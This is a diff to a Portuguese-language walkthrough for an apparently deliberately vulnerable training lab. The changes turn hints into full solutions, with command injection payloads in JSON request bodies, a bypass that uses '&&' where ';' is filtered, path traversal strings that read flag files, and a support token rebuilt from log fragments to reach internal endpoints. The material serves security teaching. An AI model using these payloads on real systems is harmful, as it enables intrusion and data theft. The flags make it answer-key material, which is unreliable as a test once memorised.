@@ -122,7 +122,12 @@ Abra DevTools Network ou configure o Burp Proxy e repita a verificacao. A chamad
 
 O detalhe central e que `target` nao e editavel na UI, mas e enviado pelo cliente.
 
-A falha nao pertence ao card Gateway Edge em si. Todos os cards usam a mesma funcionalidade de verificacao. O ponto vulneravel e o backend confiar no campo `target` enviado pelo cliente.
+Esse endpoint tem dois modos vulneraveis:
+
+- `checkType: "icmp"` usa a verificacao com ping e retorna output. Esse modo permite Command Injection com retorno visivel.
+- `checkType: "tcp"` usa uma verificacao TCP e retorna apenas metadados, incluindo `durationMs`. Esse modo e usado para Blind/Time-Based Command Injection.
+
+A falha nao pertence ao card Gateway Edge em si. Todos os cards usam a mesma funcionalidade de verificacao. O ponto vulneravel e o backend confiar em `target` e, no modo TCP, tambem em `port`, enviados pelo cliente. Qualquer card que use a feature de check pode ser explorado se voce alterar a request no Burp.
 
 ## 3. Request tampering
 
@@ -196,23 +201,59 @@ Voce deve notar pistas para um resolver legado e para `support.html`. Trate isso
 
 ## 7. Resolver legado e filtro fraco
 
-Monte manualmente no Burp Repeater uma requisicao para o resolver legado descoberto no JavaScript. Ele nao esta na UI.
+Monte manualmente no Burp Repeater uma nova requisicao para o resolver legado descoberto no JavaScript. Ele nao esta na UI e nao usa o mesmo body de `/api/assets/check`.
 
-Comece com entrada normal, depois teste se `;` e bloqueado. Em seguida, compare com um operador permitido, como `&&`, usando um comando inofensivo.
+Comece com a estrutura minima:
 
-Para capturar a segunda flag, use a falha com:
-
-```text
-localhost && cat /app/flags/flag2.txt
+```http
+POST /api/assets/resolve
+Content-Type: application/json
+Cookie: session=...
 ```
 
-A licao aqui e simples: bloquear apenas um caractere nao corrige command injection.
+```json
+{
+  "target": "localhost"
+}
+```
+
+Depois teste se `;` e bloqueado:
+
+```json
+{
+  "target": "localhost; whoami"
+}
+```
+
+Compare com um operador permitido, como `&&`, usando um comando inofensivo:
+
+```json
+{
+  "target": "localhost && id"
+}
+```
+
+Para capturar a segunda flag:
+
+```json
+{
+  "target": "localhost && cat /app/flags/flag2.txt"
+}
+```
+
+A etapa continua sendo Command Injection, mas o foco didatico muda para weak filtering/bypass: a aplicacao bloqueia apenas `;` e deixa `&&` passar.
 
 ## 8. Support diagnostics escondido
 
 A partir das pistas no HTML/JS, acesse `support.html`. Ela nao estava no menu principal.
 
-Use o campo `Log file` para abrir `app.log`. Leia o arquivo como log operacional e procure:
+Use o campo `Log file` para abrir `app.log`. Esse campo chama:
+
+```text
+/api/support/log?file=app.log
+```
+
+Leia o arquivo como log operacional e procure:
 
 - endpoint interno;
 - header esperado;
@@ -222,26 +263,42 @@ Use o campo `Log file` para abrir `app.log`. Leia o arquivo como log operacional
 
 ## 9. Path Traversal
 
-O visualizador aceita um nome de arquivo. Teste variacoes controladas e pense no caminho final que o backend pode estar montando.
+O campo `Log file` chama `/api/support/log?file=app.log`, o que sugere que o backend le arquivos a partir de um diretorio base, como `/app/data`. O proprio `app.log` diz que a evidencia foi movida para fora do data directory.
 
-Use traversal para ler:
+Ao usar:
+
+```text
+../flags/flag3.txt
+```
+
+o caminho efetivo fica como `/app/data/../flags/flag3.txt`, que resolve para `/app/flags/flag3.txt`.
+
+Use traversal para ler duas evidencias diferentes:
 
 ```text
 ../flags/flag3.txt
 ../flags/flag4.txt
 ```
 
-A causa raiz e aceitar entrada do usuario em `path.join` sem garantir que o caminho final permaneceu dentro do diretorio permitido.
+A causa raiz e aceitar entrada do usuario em `path.join` sem garantir que o caminho final permaneceu dentro do diretorio permitido. `flag3` e `flag4` sao duas evidencias diferentes obtidas pela mesma falha de path traversal.
 
 ## 10. Token interno e Broken Access Control
 
-Monte o token a partir das partes vistas nos logs:
+Os logs mostram:
+
+```text
+support token prefix: netaudit
+support token middle: debug
+support token suffix: 2026
+```
+
+Logo, o token montado e:
 
 ```text
 netaudit-debug-2026
 ```
 
-No Burp Repeater, chame `/api/internal/health` com:
+No Burp Repeater, chame `/api/internal/health` enviando:
 
 ```text
 X-Support-Token: netaudit-debug-2026
@@ -251,9 +308,39 @@ Sem token, a resposta deve ser `403`. Com token, o healthcheck retorna metadados
 
 ## 11. Backup command injection
 
-Monte manualmente um `POST` para `/api/internal/backup`, usando o header `X-Support-Token`.
+O health interno revela:
 
-Teste primeiro um body normal com `archiveName`. Depois explore o parametro para ler:
+```text
+backupEndpoint: /api/internal/backup
+method: POST
+requiredParameter: archiveName
+```
+
+Portanto, se voce acessar `/api/internal/backup` via `GET`, receber `404` ou erro e esperado. A requisicao correta precisa ser `POST`, usando o header `X-Support-Token`.
+
+Teste primeiro um body normal:
+
+```json
+{
+  "archiveName": "backup.tar.gz"
+}
+```
+
+Depois explore `archiveName`:
+
+```json
+{
+  "archiveName": "backup.tar.gz; cat /app/flags/flag5.txt"
+}
+```
+
+```json
+{
+  "archiveName": "backup.tar.gz; cat /app/flags/root.txt"
+}
+```
+
+Esses bodies leem:
 
 ```text
 /app/flags/flag5.txt
